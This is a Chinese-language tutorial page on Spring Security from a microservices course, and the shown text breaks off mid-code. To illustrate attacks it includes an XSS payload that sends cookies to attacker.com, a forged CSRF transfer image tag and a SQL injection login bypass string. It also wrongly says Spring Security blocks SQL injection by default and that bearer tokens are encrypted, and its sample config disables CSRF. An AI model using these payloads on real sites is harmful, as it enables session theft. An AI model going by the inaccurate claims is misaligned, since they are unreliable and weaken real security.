<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-14" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Spring Security | 微服务速成</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://finger-bone.github.io/micro-service-crashcourse/docs/14"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Spring Security | 微服务速成"><meta data-rh="true" name="description" content="Spring 生态圈中有两个主流的安全框架：Apache Shiro 和 Spring Security。Spring Security 是 Spring 官方的安全框架，它提供了一套完整的安全解决方案，包括认证、授权、攻击防护等。Shiro 更为轻量，也是一个不错的选择。这里我们只介绍 Spring Security。"><meta data-rh="true" property="og:description" content="Spring 生态圈中有两个主流的安全框架：Apache Shiro 和 Spring Security。Spring Security 是 Spring 官方的安全框架，它提供了一套完整的安全解决方案，包括认证、授权、攻击防护等。Shiro 更为轻量，也是一个不错的选择。这里我们只介绍 Spring Security。"><link data-rh="true" rel="icon" href="/micro-service-crashcourse/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://finger-bone.github.io/micro-service-crashcourse/docs/14"><link data-rh="true" rel="alternate" href="https://finger-bone.github.io/micro-service-crashcourse/docs/14" hreflang="en"><link data-rh="true" rel="alternate" href="https://finger-bone.github.io/micro-service-crashcourse/docs/14" hreflang="x-default"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/micro-service-crashcourse/assets/css/styles.0906fbfd.css">
<script src="/micro-service-crashcourse/assets/js/runtime~main.be976c67.js" defer="defer"></script>
<script src="/micro-service-crashcourse/assets/js/main.4cb37dc3.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/micro-service-crashcourse/"><b class="navbar__title text--truncate">微服务速成</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/micro-service-crashcourse/docs/01">Notes</a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/01">回到 Spring</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/02">回到 Java</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/03">Consul 服务注册与发现</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/04">Consul 配置管理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/05">LoadBalancer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/06">Spring Interface Client 与 OpenFeign REST 服务调用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/07">Resilience4j 服务熔断和降级</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/08">Resilience4j Bulkhead, RateLimiter, TimeLimiter 限流</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/09">MicroMeter Tracing 服务链路追踪</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/10">GateWay 网关</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/11">分布式事务 Seata</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/12">Reactor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/13">WebFlux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" href="/micro-service-crashcourse/docs/14">Spring Security</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/15">Spring Security OAuth 认证与 KeyCloak</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/16">Rabbit MQ</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/17">GraphQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/18">gRPC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/19">后端框架一览</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/20">k8s 无状态服务基本部署</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/21">helm 打包 istio 网关与 k8s 命令行工具</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/22">k8s 无状态服务</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/23">k8s 有状态服务</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/24">服务网格</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/25">Nacos 服务治理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/26">Sentinel</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/27">Kafka 高性能消息队列</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/28">Redis</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/29">OTel-LGTM</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/30">Dubbo RPC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/31">Nginx</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/32">32</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/micro-service-crashcourse/docs/33">33</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/micro-service-crashcourse/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Spring Security</span><meta itemprop="position" content="1"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Spring Security</h1></header>
<p>Spring 生态圈中有两个主流的安全框架：Apache Shiro 和 Spring Security。Spring Security 是 Spring 官方的安全框架，它提供了一套完整的安全解决方案，包括认证、授权、攻击防护等。Shiro 更为轻量，也是一个不错的选择。这里我们只介绍 Spring Security。</p>
<p>这里我们的演示使用 Spring WebFlux。在这里使用 Reactive 版的目的是为了展示 Spring WebFlux 的应用，但这不影响 Spring Security 的学习。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="spring-security-三大职能">Spring Security 三大职能<a href="#spring-security-三大职能" class="hash-link" aria-label="Direct link to Spring Security 三大职能" title="Direct link to Spring Security 三大职能">​</a></h2>
<ul>
<li>攻击防护（Attack Protection），包括防止常见的网络安全攻击，如 CSRF、XSS等。</li>
<li>认证（Authentication），验证用户的身份。</li>
<li>鉴权（Authorization），控制用户对资源的访问权限。</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="攻击防护">攻击防护<a href="#攻击防护" class="hash-link" aria-label="Direct link to 攻击防护" title="Direct link to 攻击防护">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="常见的网络安全攻击及其原理">常见的网络安全攻击及其原理<a href="#常见的网络安全攻击及其原理" class="hash-link" aria-label="Direct link to 常见的网络安全攻击及其原理" title="Direct link to 常见的网络安全攻击及其原理">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="csrfcross-site-request-forgery">CSRF（Cross-Site Request Forgery）<a href="#csrfcross-site-request-forgery" class="hash-link" aria-label="Direct link to CSRF（Cross-Site Request Forgery）" title="Direct link to CSRF（Cross-Site Request Forgery）">​</a></h4>
<p>CSRF 是一种网络攻击，攻击者利用用户的登录状态发起恶意请求。攻击者可以伪造请求，让用户在不知情的情况下执行恶意操作。</p>
<p>例如，如果用户在<code>http://bank.com/transfer</code>页面上登录了银行账号，攻击者可以在另一个页面上放置一个<code>&lt;img src=&quot;http://bank.com/transfer?to=attacker&amp;amount=1000&quot;&gt;</code>的图片，当用户访问这个页面时，浏览器会自动加载这个图片。因为用户的网络环境中已经有了银行的 Cookie，所以这个请求会带上用户的 Cookie，从而执行了转账操作。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="xsscross-site-scripting">XSS（Cross-Site Scripting）<a href="#xsscross-site-scripting" class="hash-link" aria-label="Direct link to XSS（Cross-Site Scripting）" title="Direct link to XSS（Cross-Site Scripting）">​</a></h4>
<p>XSS 是一种网络攻击，攻击者在网页中注入恶意脚本，当用户访问这个页面时，脚本会在用户的浏览器中执行。这样攻击者就可以获取用户的 Cookie、密码等信息。</p>
<p>这种攻击很像 SQL 注入，只不过 SQL 注入是攻击数据库，而 XSS 是攻击用户。</p>
<p>一种常见的 XSS 攻击是在评论框中注入脚本，当其他用户访问这个页面时，脚本会在他们的浏览器中执行。例如，攻击者在评论框中输入<code>&lt;script&gt;fetch(&#x27;http://attacker.com?cookie=&#x27; + document.cookie)&lt;/script&gt;</code>，这样其他用户访问这个页面时，就会向<code>http://attacker.com</code>发送请求，从而泄露 Cookie。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="sql-注入">SQL 注入<a href="#sql-注入" class="hash-link" aria-label="Direct link to SQL 注入" title="Direct link to SQL 注入">​</a></h4>
<p>SQL 注入是一种网络攻击，攻击者在输入框中输入恶意 SQL 语句，当这个 SQL 语句被拼接到数据库查询中时，就会执行这个 SQL 语句。</p>
<p>例如，如果一个登录页面的 SQL 查询是<code>SELECT * FROM users WHERE username = &#x27;${username}&#x27; AND password = &#x27;${password}&#x27;</code>，攻击者可以输入<code>&#x27; OR 1=1 --</code>，这样 SQL 查询就变成了<code>SELECT * FROM users WHERE username = &#x27;&#x27; OR 1=1 --&#x27; AND password = &#x27;${password}&#x27;</code>，这样就绕过了密码验证。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="点击劫持">点击劫持<a href="#点击劫持" class="hash-link" aria-label="Direct link to 点击劫持" title="Direct link to 点击劫持">​</a></h4>
<p>点击劫持是一种网络攻击，攻击者在一个透明的 iframe 中放置一个恶意网页，然后将这个 iframe 放在一个看似无害的页面上。当用户点击这个页面时，实际上是点击了 iframe 中的恶意网页。</p>
<p>例如，攻击者在一个透明的 iframe 中放置一个银行转账页面，然后将这个 iframe 放在一个看似无害的页面上。当用户点击这个页面时，实际上是点击了银行转账页面，从而执行了转账操作。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置-spring-security-进行攻击防护">配置 Spring Security 进行攻击防护<a href="#配置-spring-security-进行攻击防护" class="hash-link" aria-label="Direct link to 配置 Spring Security 进行攻击防护" title="Direct link to 配置 Spring Security 进行攻击防护">​</a></h3>
<p>Spring Security 中，所有的功能都是通过 SecurityFilterChain 实现的。如名字所示，SecurityFilterChain 是一个过滤器链，它包含了一系列的过滤器，每个过滤器负责一个功能。</p>
<p>对于 Spring Web，这个过滤器是 Servlet Filter；对于 Spring WebFlux，这个过滤器是 WebFilter。不过，两者的功能是一样的。</p>
<p>Spring Security 默认开启了全部的攻击防护功能，包括 CSRF、XSS、SQL 注入等。我们可以通过配置来关闭这些功能。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@EnableWebFluxSecurity</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class SecurityConfig {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public SecurityWebFilterChain securityWebFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ServerHttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果是 Servlet 版本，使用，</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Configuration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@EnableWebSecurity</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class SecurityConfig {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public SecurityFilterChain securityFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        HttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>注意，网上的很多资料都的写法都过时了，现在的写法叫 lambda DSL，即<code>.功能名(参数 -&gt; 参数设置)</code>。如果保持默认设置，使用<code>Customizer.withDefaults()</code>即可。</p>
<p>上面每一条语句都创建一个 Filter，<code>.csrf(csrf -&gt; csrf.disable())</code>即创建了<code>CsrfWebFilter</code>，<code>.cors(Customizer.withDefaults())</code>即创建了<code>CorsWebFilter</code>。这些 Filter 会被添加到 SecurityFilterChain 中。最后通过<code>.build()</code>创建 SecurityFilterChain。</p>
<p>这些攻击的防护基本是无感的，不需要做太多操作，均默认开启。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="单体应用的认证与鉴权">单体应用的认证与鉴权<a href="#单体应用的认证与鉴权" class="hash-link" aria-label="Direct link to 单体应用的认证与鉴权" title="Direct link to 单体应用的认证与鉴权">​</a></h2>
<p>Spring Security 提供了多种认证方式，包括用户名密码认证、OAuth2 认证等。在这一部分，我们只介绍用户名密码认证，并自己实现 JWT 认证。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="认证信息的传递">认证信息的传递<a href="#认证信息的传递" class="hash-link" aria-label="Direct link to 认证信息的传递" title="Direct link to 认证信息的传递">​</a></h3>
<p>认证信息的传递有两种方式：Cookie 和 Token。</p>
<p>Cookie 是一种存储在浏览器中的信息，它会随着每次请求一起发送到服务器。Cookie 有两种：会话 Cookie 和持久 Cookie。会话 Cookie 是一种临时 Cookie，它会在浏览器关闭时被删除；持久 Cookie 是一种长期 Cookie，它会在浏览器关闭时被保存。</p>
<p>不过，现在的大部分的认证信息都是通过 Token 传递的。Token 是一种短期的认证信息，它会在一段时间后失效。简单来说，Token 就是一个字符串，它包含了用户的信息，如用户名、权限等。与 Cookie 不同，Token 是存储在客户端的，它会在每次请求时被发送到服务器，如此，服务器就是无状态的。</p>
<p>Token 一般通过 HTTP 请求头部的<code>Authorization</code>字段传递。其内容根据 Token 的类型不同而不同。但格式都是<code>格式 数据</code>中间有一个空格。</p>
<p>常用的格式只有两种，<code>Basic</code>和<code>Bearer</code>。前者只用于用户名-密码认证，又称为 HTTP Basic 认证；后者广泛用于多种认证方式，称为 Bearer Token 认证。</p>
<p>Basic 认证的格式是<code>Basic base64(username:password)</code>，其中<code>base64(username:password)</code>是<code>用户名:密码</code>的 base64 编码。这种认证方式不安全，因为用户名和密码是明文传输的。</p>
<p>Bearer Token 认证的格式是<code>Bearer token</code>，其中<code>token</code>是 Token 的内容。这种认证方式相对安全，因为 Token 是加密的。Token 的具体内容取决于认证方式。</p>
<p>此外，还有一种表单认证，即通过表单提交用户名和密码。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="spring-security-认证与鉴权流程">Spring Security 认证与鉴权流程<a href="#spring-security-认证与鉴权流程" class="hash-link" aria-label="Direct link to Spring Security 认证与鉴权流程" title="Direct link to Spring Security 认证与鉴权流程">​</a></h3>
<p>Spring Security 的每个鉴权请求都是由 SecurityContext 处理的。由于每个 HTTP 请求都有独立的线程处理，因此存储是通过 ThreadLocal 实现的。</p>
<p>当前线程的 SecurityContext 通过<code>SecurityContextHolder.getContext()</code>获取，其中包含了当前用户的信息。这个信息是通过<code>Authentication</code>对象表示的，其中包含了用户的身份、凭证、权限等信息。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SecurityContext context = SecurityContextHolder.createEmptyContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Authentication authentication =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    new TestingAuthenticationToken(&quot;username&quot;, &quot;password&quot;, &quot;ROLE_USER&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context.setAuthentication(authentication);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SecurityContextHolder.setContext(context);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>上面的代码创建了一个<code>SecurityContext</code>，并设置了一个<code>Authentication</code>对象。这个<code>Authentication</code>对象表示了一个用户，其中包含了用户名、密码、权限等信息。</p>
<p>SecurityFilterChain 负责把用户请求处理成<code>Authentication</code>对象，然后把这个对象存储到<code>SecurityContext</code>中。</p>
<p><code>Authentication</code>其实是一个接口，定义如下，</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">public interface Authentication extends Principal, Serializable {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	Collection&lt;? extends GrantedAuthority&gt; getAuthorities();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	Object getCredentials();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	Object getDetails();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	Object getPrincipal();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	boolean isAuthenticated();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 